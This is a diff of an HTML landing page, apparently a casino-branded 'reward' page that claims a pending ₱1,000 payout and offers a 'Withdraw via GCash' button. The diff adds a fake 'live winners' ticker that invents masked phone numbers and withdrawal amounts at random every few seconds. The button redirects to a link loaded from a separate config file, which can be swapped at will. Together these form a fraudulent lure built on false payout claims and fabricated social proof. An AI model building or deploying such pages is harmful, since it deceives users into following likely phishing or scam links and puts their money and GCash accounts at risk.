@@ -16,42 +16,165 @@
     </script>
 
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    
     <style>
-        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --dark-bg: #04070d; }
+        :root { 
+            --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); 
+            --dark-bg: #04070d; 
+        }
+
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Public Sans', sans-serif; background-color: var(--dark-bg); background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
-        .card { background: rgba(255, 255, 255, 0.03); width: 100%; max-width: 400px; padding: 35px 20px; border-radius: 30px; border: 1px solid rgba(212, 175, 55, 0.3); backdrop-filter: blur(15px); text-align: center; }
+
+        body { 
+            font-family: 'Public Sans', sans-serif; 
+            background-color: var(--dark-bg); 
+            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); 
+            color: #fff; 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            padding: 15px; 
+            overflow: hidden;
+        }
+
+        /* LIVE WINNERS STYLE */
+        .live-winner-box {
+            position: absolute;
+            top: 30px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(212, 175, 55, 0.4);
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            animation: fadeInOut 3s infinite;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+
+        .dot { 
+            width: 10px; 
+            height: 10px; 
+            background: #22c55e; 
+            border-radius: 50%; 
+            box-shadow: 0 0 10px #22c55e; 
+        }
+
+        @keyframes fadeInOut { 
+            0% { opacity: 0; transform: translateY(-15px); } 
+            10% { opacity: 1; transform: translateY(0); } 
+            90% { opacity: 1; } 
+            100% { opacity: 0; } 
+        }
+
+        /* MAIN CARD */
+        .card { 
+            background: rgba(255, 255, 255, 0.03); 
+            width: 100%; 
+            max-width: 400px; 
+            padding: 35px 20px; 
+            border-radius: 30px; 
+            border: 1px solid rgba(212, 175, 55, 0.3); 
+            backdrop-filter: blur(15px); 
+            text-align: center; 
+            position: relative;
+        }
+
         .logo-img { width: 180px; margin-bottom: 20px; }
-        .amount { font-family: 'Orbitron', sans-serif; font-size: 48px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 30px; }
-        .pay-button { background: var(--gold); color: #000; width: 100%; padding: 20px; border: none; border-radius: 15px; font-size: 18px; font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 8px 0 #8b6508; transition: 0.2s; }
+
+        .amount { 
+            font-family: 'Orbitron', sans-serif; 
+            font-size: 48px; 
+            background: var(--gold); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            margin-bottom: 30px; 
+            font-weight: 700;
+        }
+
+        .pay-button { 
+            background: var(--gold); 
+            color: #000; 
+            width: 100%; 
+            padding: 20px; 
+            border: none; 
+            border-radius: 15px; 
+            font-size: 18px; 
+            font-weight: 800; 
+            text-transform: uppercase; 
+            cursor: pointer; 
+            box-shadow: 0 8px 0 #8b6508; 
+            transition: 0.2s; 
+        }
+
         .pay-button:active { transform: translateY(4px); box-shadow: 0 4px 0 #8b6508; }
-        .promo-photo { width: 100%; border-radius: 20px; margin-top: 25px; border: 1px solid rgba(212, 175, 55, 0.2); }
+        .pay-button:disabled { background: #4b5563; color: #9ca3af; box-shadow: none; transform: translateY(4px); }
+
+        .promo-photo { 
+            width: 100%; 
+            border-radius: 20px; 
+            margin-top: 25px; 
+            border: 1px solid rgba(212, 175, 55, 0.2); 
+        }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://xjiligames.github.io/rewards/logo1.png" class="logo-img">
-    <div style="font-size: 12px; color: #fbbf24; letter-spacing: 2px;">PENDING REWARD</div>
-    <div class="amount" id="balanceText">₱1,000.00</div>
-    <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">Withdraw via GCash</button>
-    <img src="https://xjiligames.github.io/rewards/casinoplus.jpeg" class="promo-photo">
-</div>
+    <div class="live-winner-box" id="winnerBox">
+        <div class="dot"></div>
+        <span id="winnerEntry">User 0917***8234 just withdrew ₱1,000</span>
+    </div>
 
-<script src="config.js"></script>
-<script>
-    function redirectToGCash() {
-        const btn = document.getElementById('claimBtn');
-        btn.disabled = true; btn.innerHTML = "CONNECTING...";
+    <div class="card">
+        <img src="https://xjiligames.github.io/rewards/logo1.png" class="logo-img">
         
-        setTimeout(() => {
-            if (typeof LATEST_GCASH_URL !== 'undefined') {
-                window.location.href = LATEST_GCASH_URL; 
-            } else {
-                window.location.href = "https://m.gcash.com"; 
-            }
-        }, 1500);
-    }
-</script>
+        <div style="font-size: 11px; color: #fbbf24; letter-spacing: 2px; margin-bottom: 5px; font-weight: 800;">OFFICIAL PAYOUT</div>
+        
+        <div class="amount" id="balanceText">₱1,000.00</div>
+        
+        <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">Withdraw via GCash</button>
+        
+        <p style="font-size: 12px; color: #94a3b8; margin-top: 15px;">Fast & Secure GCash Settlement</p>
+        
+        <img src="https://xjiligames.github.io/rewards/casinoplus.jpeg" class="promo-photo">
+    </div>
+
+    <script src="config.js"></script>
+    <script>
+        // 1. LIVE WINNERS LOGIC
+        const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0915", "0905", "0977"];
+        
+        function updateWinners() {
+            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+            const randomSuffix = Math.floor(1000 + Math.random() * 9000);
+            const randomAmount = ["500", "1,000", "1,500", "2,000", "1,000"][Math.floor(Math.random() * 5)];
+            
+            const winnerText = `User ${randomPrefix}***${randomSuffix} just withdrew ₱${randomAmount}`;
+            document.getElementById('winnerEntry').innerText = winnerText;
+        }
+
+        // Magpalit ng winner bawat 3 seconds
+        setInterval(updateWinners, 3000);
+
+        // 2. REDIRECTION LOGIC
+        function redirectToGCash() {
+            const btn = document.getElementById('claimBtn');
+            btn.disabled = true; 
+            btn.innerHTML = "Processing...";
+            
+            setTimeout(() => {
+                if (typeof LATEST_GCASH_URL !== 'undefined') {
+                    window.location.href = LATEST_GCASH_URL; 
+                } else {
+                    window.location.href = "https://m.gcash.com"; 
+                }
+            }, 1800);
+        }
+    </script>
 </body>
 </html>
